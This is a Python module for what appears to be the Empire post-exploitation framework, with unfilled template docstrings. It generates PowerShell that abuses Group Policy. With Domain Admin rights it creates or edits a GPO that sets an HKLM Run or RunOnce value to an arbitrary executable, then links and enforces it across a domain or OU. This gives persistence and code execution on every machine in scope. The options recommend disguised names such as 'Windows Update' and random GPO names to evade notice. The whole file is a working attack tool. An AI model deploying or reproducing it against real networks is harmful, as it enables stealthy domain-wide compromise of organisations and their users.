"""
DESCRIBE YOUR MODULE HERE.

Preferably with some in-depth stuff.
"""
from lib.common import helpers


class Module:
    """
    DESCRIBE THIS CLASS HERE.

    Here is the space for functionality and options.
    """

    def __init__(self, mainMenu, params=[]):
        """Initialize the module."""
        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'Set-GpRegistryValue',

            # List of one or more authors for the module
            'Author': ['Immanuel Willi', 'Yves Kraft (@nrx_ch)'],

            # More verbose multi-line description of the module
            'Description': ("This module is intended to set a Run or RunOnce registry value using Group Policy Objects (GPO). "
                            "It creates a new (or modifies an existing) GPO on the Domain Controller. "
                            "Options for linking and enabling GPOs can be provided if required. "
                            "Requirements: This module needs Domain Admin privileges, and needs to be run against a Domain Controller!"),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '2',
        }
        # Any options needed by the module, settable during runtime
        self.options = {
            # Format:
            #   value_name : {description, required, default_value}
            'Agent': {
                'Description'   :   'Agent with Domain Admin privileges on a Domain Controller.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'RegistryValueName': {
                'Description'   :   'The name to give the registry value (e.g. something stealthy like "Windows Update"). The default value is a random string.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'GpoName': {
                'Description'   :   'Either the module creates a new GPO with the given name, or extends an existing GPO (i.e. "Default Domain Policy"). The default value is a random string.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'RegistryValue': {
                'Description'   :   'Path to executable.',
                'Required'      :   True,
                'Value'         :   'calc.exe'
            },
            'RunOption': {
                'Description'   :   'Set registry key for HKLM\Software\Microsoft\Windows\CurrentVersion\Run or \RunOnce. Accepted values are "run" or "runonce".',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LinkGpo': {
                'Description'   :   'Link the GPO to a site, domain or organizational unit (OU). Accepted values are "yes" or "no".',
                'Required'      :   False,
                'Value'         :   'yes'
            },
            'LinkEnableGpo': {
                'Description'   :   'Specifies whether the GPO link is enabled. Possible values are "yes" or "no".',
                'Required'      :   False,
                'Value'         :   'Yes'
            },
            'ADSpath': {
                'Description'   :   'Specify the LDAP distinguished name of the site, domain or OU to which to link the GPO (e.g. for corp.com, the LDAP distinguished name is "DC=corp,DC=com)".',
                'Required'      :   True,
                'Value'         :   '"DC=corp,DC=com"'
            }

        }
        # Save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self):
        """
        Generate the PowerShell script.

        The PowerShell script itself, with the command to invoke
        for execution appended to the end. Scripts should output
        everything to the pipeline for proper parsing.
        The script should be stripped of comments, with a link to any
        original reference script included in the comments.
        """
        moduleName = self.info["Name"]
        # script = moduleName
        script = """
        Function Get-RandomString($length = 31)
        {
            $rand_string = ([char[]]([char]'a'..[char]'z' + [char]'0'..[char]'9') * 20 | sort {get-random})[0..$length] -join ''
            return $rand_string
        }

        Function Set-GpRegistryValue
        {
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory = $False)]
                [ValidateNotNullOrEmpty()]
                [String]
                $Name,

                [String]
                $GpoName,

                [String]
                $RegistryValueName,

                [String]
                $RegistryValue,

                [String]
                $RunOption,

                [String]
                $LinkGpo,

                [String]
                $LinkEnableGpo,

                [String]
                $ADSpath
            )

            if ($GpoName -eq ""){
                $GpoName=Get-RandomString
            }
            Write-Output "`nNew GPO created:"
            New-GPO -Name "$GpoName"

            if ($RunOption.ToLower() -eq "run"){
                $key="HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
            }

            if ($RunOption.ToLower() -eq "runonce"){
                $key="HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
            }

            if ($RegistryValueName -eq ""){
                $RegistryValueName=Get-RandomString
            }

            GroupPolicy\Set-GPRegistryValue -Name $GpoName -Key $key -ValueName $RegistryValueName -Type String -value $RegistryValue >$Null
            if ($LinkGpo.ToLower() -eq "yes"){
                New-GPLink -Name $GpoName -Target $ADSpath -Enforced Yes -LinkEnabled $LinkEnableGpo >$Null
            }
        }

        Set-GpRegistryValue"""

        # Add any arguments to the end execution of the script
        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value']:
                    if values['Value'].lower() == "true":
                        # If we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])
        script += ' | Out-String | %{$_ + \"`n\"};"`n' + str(moduleName) + ' completed!"'

        return script
